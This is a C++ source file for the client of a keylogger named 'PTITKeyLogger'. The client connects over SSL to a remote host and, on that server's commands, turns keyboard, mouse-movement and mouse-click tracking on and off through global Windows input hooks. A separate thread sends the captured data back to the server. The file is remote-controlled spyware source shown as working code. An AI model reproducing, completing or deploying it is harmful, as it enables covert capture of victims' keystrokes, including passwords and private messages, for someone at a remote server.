#include "stdafx.h"
#include "BoostNetwork.h"
#include "Client.hpp"
#include "KbHooker.hpp"
#include "MouseHooker.hpp"
#include <iostream>
Client::Client(const std::string &port, const std::string &host, boost::asio::io_service &io_service, boost::asio::ssl::context &context) : _network(std::make_shared<BoostNetwork>(port, host, io_service, context)),
                                                                                                                                            _sendListQ({{PTITKeyLogger::RequestCode::VALID_ASK_ID_RESPONSE, &Client::responseClientId},
                                                                                                                                                        {PTITKeyLogger::RequestCode::VALID_DISCONNECT, &Client::responseShutdown},
                                                                                                                                                        {PTITKeyLogger::RequestCode::VALID_GET_STATUS_RESPONSE, &Client::responseStatus}}),
                                                                                                                                            _requList({{PTITKeyLogger::RequestCode::PING, (&Client::requestPing)},
                                                                                                                                                       {PTITKeyLogger::RequestCode::ASK_ID, (&Client::requestId)},
                                                                                                                                                       {PTITKeyLogger::RequestCode::KEYBOARD_TRACK_ACTIVATE, (&Client::requestKbActivate)},
                                                                                                                                                       {PTITKeyLogger::RequestCode::KEYBOARD_TRACK_DEACTIVATE, (&Client::requestKbDeactivate)},
                                                                                                                                                       {PTITKeyLogger::RequestCode::MOUSE_MVMT_TRACK_ACTIVATE, (&Client::requestTrackActivate)},
                                                                                                                                                       {PTITKeyLogger::RequestCode::MOUSE_MVMT_TRACK_DEACTIVATE, (&Client::requestTrackDeactivate)},
                                                                                                                                                       {PTITKeyLogger::RequestCode::MOUSE_CLICK_TRACK_ACTIVATE, (&Client::requestClickActivate)},
                                                                                                                                                       {PTITKeyLogger::RequestCode::MOUSE_CLICK_TRACK_DEACTIVATE, (&Client::requestClickDeactivate)},
                                                                                                                                                       {PTITKeyLogger::RequestCode::DISCONNECT, (&Client::requestDisconnect)},
                                                                                                                                                       {PTITKeyLogger::RequestCode::PAUSE_ACTIVATE, (&Client::requestPauseActivate)},
                                                                                                                                                       {PTITKeyLogger::RequestCode::PAUSE_DEACTIVATE, (&Client::requestPauseDeactivate)},
                                                                                                                                                       {PTITKeyLogger::RequestCode::SET_FREQUENCY, (&Client::requestFrequency)},
                                                                                                                                                       {PTITKeyLogger::RequestCode::GET_STATUS, (&Client::requestStatus)}})
{
    gControlData = &_data;
}

int Client::connectClient()
{
    PTITKeyLogger::RequestCode toSend;
    r_fnct func;

    try
    {
        _network->tryConnection();
        std::thread sendThread(sendData, std::ref(*this));
        std::thread inputThread(startHooking);
        while (true)
        {
            _code = _network->receive();
            try
            {
                func = _requList.at(static_cast<PTITKeyLogger::RequestCode>(_code));
            }
            catch (const std::exception &e)
            {
                std::cout << e.what() << std::endl;
                continue;
            }
            toSend = (this->*func)();
            _msgQ.push(toSend);
            _network->run();
        }
        sendThread.join();
        inputThread.join();
    }
    catch (const std::exception &e)
    {
        std::cerr << e.what() << std::endl;
        return (EXIT_FAILURE);
    }
    return (EXIT_SUCCESS);
}

// REQUEST FUNCTIONS

PTITKeyLogger::RequestCode Client::requestPing() { return (PTITKeyLogger::VALID_PING_RESPONSE); }

PTITKeyLogger::RequestCode Client::requestId() { return (PTITKeyLogger::VALID_ASK_ID_RESPONSE); }

PTITKeyLogger::RequestCode Client::requestKbActivate()
{
    _data._state.activateKb();
    return (PTITKeyLogger::VALID_KEYBOARD_TRACK_ACTIVATE);
}

PTITKeyLogger::RequestCode Client::requestKbDeactivate()
{
    _data._state.deactivateKb();
    return (PTITKeyLogger::VALID_KEYBOARD_TRACK_DEACTIVATE);
}

PTITKeyLogger::RequestCode Client::requestTrackActivate()
{
    _data._state.activateTracking();
    return (PTITKeyLogger::VALID_MOUSE_MVMT_TRACK_ACTIVATE);
}

PTITKeyLogger::RequestCode Client::requestTrackDeactivate()
{
    _data._state.deactivateTracking();
    return (PTITKeyLogger::VALID_MOUSE_MVMT_TRACK_DEACTIVATE);
}

PTITKeyLogger::RequestCode Client::requestClickActivate()
{
    _data._state.activateClick();
    return (PTITKeyLogger::VALID_MOUSE_CLICK_TRACK_ACTIVATE);
}

PTITKeyLogger::RequestCode Client::requestClickDeactivate()
{
    _data._state.deactivateClick();
    return (PTITKeyLogger::VALID_MOUSE_CLICK_TRACK_DEACTIVATE);
}

PTITKeyLogger::RequestCode Client::requestDisconnect() { return (PTITKeyLogger::VALID_DISCONNECT); }

PTITKeyLogger::RequestCode Client::requestPauseActivate()
{
    _data._state.activatePause();
    return (PTITKeyLogger::VALID_PAUSE_ACTIVATE);
}

PTITKeyLogger::RequestCode Client::requestPauseDeactivate()
{
    _data._state.deactivatePause();
    return (PTITKeyLogger::VALID_PAUSE_DEACTIVATE);
}

PTITKeyLogger::RequestCode Client::requestFrequency() { return (PTITKeyLogger::VALID_SET_FREQUENCY); }

PTITKeyLogger::RequestCode Client::requestStatus() { return (PTITKeyLogger::VALID_GET_STATUS_RESPONSE); }

/* INITIATE KEYLOGGER */

void Client::startHooking()
{
    KbHooker *kbh = new KbHooker();
    MouseHooker *mh = new MouseHooker();
    MSG msg;

    kbh->startHook();
    mh->startHook();
    while (GetMessage(&msg, NULL, 0, 0))
    {
    }
    kbh->stopHook();
    mh->stopHook();
}